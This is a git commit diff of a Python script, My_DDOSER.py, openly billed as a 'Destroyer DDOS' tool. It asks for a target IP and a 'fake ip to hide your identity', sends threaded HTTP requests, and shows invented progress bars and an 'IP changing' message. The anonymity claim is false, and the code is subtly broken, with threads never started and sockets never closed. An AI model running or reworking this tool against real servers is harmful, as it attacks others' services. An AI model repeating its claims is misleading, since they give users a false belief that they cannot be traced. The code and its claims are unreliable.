128645163836bc6d216a374b9b87fbe5812d0140
Saadkhan041 <93708296+Saadkhan041@users.noreply.github.com>
2021-12-05 12:00:21 +0500

    Fixed Known bugs
    1. Added  more visibility
    2. Added more control

--- My_DDOSER.py
+++ My_DDOSER.py
@@ -1,6 +1,7 @@
 import os,pyfiglet,random
 import threading
-import socket
+import socket,colorama
+from colorama import Fore
 import time
 black='\033[30m'
 red='\033[31m'
@@ -17,89 +18,107 @@ yellow='\033[93m'
 lightblue='\033[94m'
 pink='\033[95m'
 lightcyan='\033[96m'
-all_col = [red,green,orange,cyan,lightgrey,lightred,lightgreen,yellow,lightcyan]
+all_col = [red,green,orange,cyan,lightgrey,blue,lightred,lightgreen,yellow,lightcyan,lightblue,pink]
 ran = random.choice(all_col)
-os.system("clear")
-name = pyfiglet.figlet_format("Destoyer")
-d = pyfiglet.figlet_format("DDOS")
+os.system("pip install colorama")
+os.system("pip install pyfiglet")
 
-print(f"{ran}{name}")
-ran2 = random.choice(all_col)
-print(f"{ran2}{d}")
-ran3 = random.choice(all_col)
-print("-"*20,"\n")
-print(f"{ran3}",("  "*3),"[+] Follow me on instagram @saadkhan041\n\n[+] V_1.0\n\n")
-ran4 = random.choice(all_col)
-cont = ""
-while cont!= "n" and "no":
-    
-    target = input("Enter Target ip: ")
+def banner():
+    os.system("clear")
+    en = pyfiglet.figlet_format("Destroyer\nDDOS\n")
+    print(ran, en)
+    print(ran + "\n\t\tV_2.1\t\n\n")
+
+    print(Fore.CYAN, "- " * 4, " [+] Follow me on Instagram @saadkhan041 ", "- " * 4)
+    print(Fore.LIGHTYELLOW_EX, "\n", "- " * 4, " [+] Follow me on Instagram @coding_memz ", "- " * 4)
+    print(Fore.LIGHTRED_EX, "\n", "- " * 4, "[+] Github: https://github.com/Saadkhan041/ ", "- " * 3)
+
+banner()
+
+
+def ddos(port=80):
     try:
-
-        port = int(input(f"{ran4}Enter port number [default port is 80]: "))
+        stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        stream.connect((target, port))
+        stream.sendto((f"GET /{target} HTTP/1.1\r\n").encode("ascii"), (target, port))
+        stream.sendto(f"HOST: {fake_ip}\r\n\r\n".encode("ascii"), (target, port))
+        stream.close
     except ValueError:
         port = 80
-        print(f"{ran3} Port 80 is selected ")
-    else:
-        print(f"{ran}port {port} is selected! ")
+        print(f"{ran4}You skipped the name of port :-(")
 
-    fake_ip = input(f"{ran}Type fake ip to hide your identity: ")
+    except KeyboardInterrupt:
+        print(f"{ran}Have a Good Day :-)")
 
-    range_of_req = int(input(f"{ran2}Enter the range of requests: "))
-    
-    print(lightred , "Wait untill all requests are sent"+("_ "*10))
+    except TimeoutError:
+        print("Requests sent successfully\n\nServer timed out!!!!")
 
-    def ddos(port=80):
+    except ConnectionRefusedError:
+        print(ran, "You've typed wrong ip address")
+
+
+
+
+cont =" "
+while cont != "n" and "no":
+    print(Fore.LIGHTYELLOW_EX+ "\n\t\t[1] DDOS Attack\n\t\t[2] Exit\n ")
+
+    choice = input(ran + "Enter your choice: ")
+    if choice == "1":
+        target = input(ran + "\nEnter Target ip: ")
         try:
-            stream = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            stream.connect((target,port))
-            stream.sendto((f"GET /{target} HTTP/1.1\r\n").encode("ascii"),(target,port))
-            stream.sendto(f"HOST: {fake_ip}\r\n\r\n".encode("ascii"),(target,port))
-            stream.close
+
+            port = int(input(f"{ran}\nEnter port number [default port is 80]: "))
         except ValueError:
-            port =80
-            print(f"{ran4}You skipped the name of port :-(")
+            port = 80
+            print(f"{ran} \nPort 80 is selected ")
+        else:
+            print(f"{ran}\nport {port} is selected! ")
 
-        except KeyboardInterrupt:
-            print(f"{ran}Have a Good Day :-)")
-            
-        except TimeoutError:
-            print("Requests sent successfully\n\nServer timed out!!!!")
-            
-        except ConnectionRefusedError:
-            print(ran,"You've typed wrong ip address")
+        fake_ip = input(f"{ran}\nType fake ip to hide your identity: ")
 
-        
-        
+        range_of_req = int(input(f"{ran}\nEnter the range of requests: "))
 
-    ddos(port)
-    os.system("clear")
-    print(lightblue , "Changing Your ip to:",fake_ip)
-    print(cyan , "Connecting to port! ")
-    print(pyfiglet.figlet_format("Attack\nStarting"))
+        print(lightred, "\nWait untill all requests are sent" + ("_ " * 10))
+        ddos(port)
+        print(lightblue, "\nChanging Your ip to:", fake_ip)
+        print(cyan, "\nConnecting to port! ")
+        print(pyfiglet.figlet_format("\tAttack\n\tStarting"))
 
-    for i in range(range_of_req):
-        thr = threading.Thread(target=ddos)
-        thr.start
+        for i in range(range_of_req):
+            thr = threading.Thread(target=ddos)
+            thr.start
 
-    print(ran,"[                    ] 0% ")
-    time.sleep(5)
-    print(ran2,"[=====               ] 25%")
-    time.sleep(5)
-    print(ran3,"[==========          ] 50%")
-    time.sleep(5)
-    print(ran4,"[===============     ] 75%")
-    time.sleep(5)
-    print(cyan,"[====================] 100%")
-    time.sleep(3)
+        print(ran, "[                    ] 0% ")
+        time.sleep(3)
+        print(ran, "[=====               ] 25%")
+        time.sleep(2)
+        print(ran, "[==========          ] 50%")
+        time.sleep(3)
+        print(ran, "[===============     ] 75%")
+        time.sleep(2)
+        print(cyan, "[====================] 100%")
+        time.sleep(3)
 
-    print(f"{ran4}\n\n\r[+] DDOS done successfully! \n\n")
-    cont = input(f"{ran4}[-]Do You want to continue? [y/n]: ").lower
+        print(f"{ran}\n\n\r[+] DDOS done successfully! \n\n")
 
-    if cont == "n" or "no":
-        break
+    elif choice == "2":
+        print(ran + "\n\tDont Forget to do following tasks :-)\t\n")
+        print(Fore.CYAN, "- " * 4, " [+] Follow me on Instagram @saadkhan041 ", "- " * 4)
+        print(Fore.LIGHTYELLOW_EX, "\n", "- " * 4, " [+] Follow me on Instagram @coding_memz ", "- " * 4)
+        print(Fore.LIGHTRED_EX, "\n", "- " * 4, "[+] Github: https://github.com/Saadkhan041/ ", "- " * 3)
+        exit()
+
     else:
-        pass
+        print(ran + "\nInvalid option")
+        exit()
+    cont = input(ran + "\nDo you want to continue? [y/n]:")
+
+    if cont == "y":
+        os.system("clear")
+        banner()
+
+
 
     
 
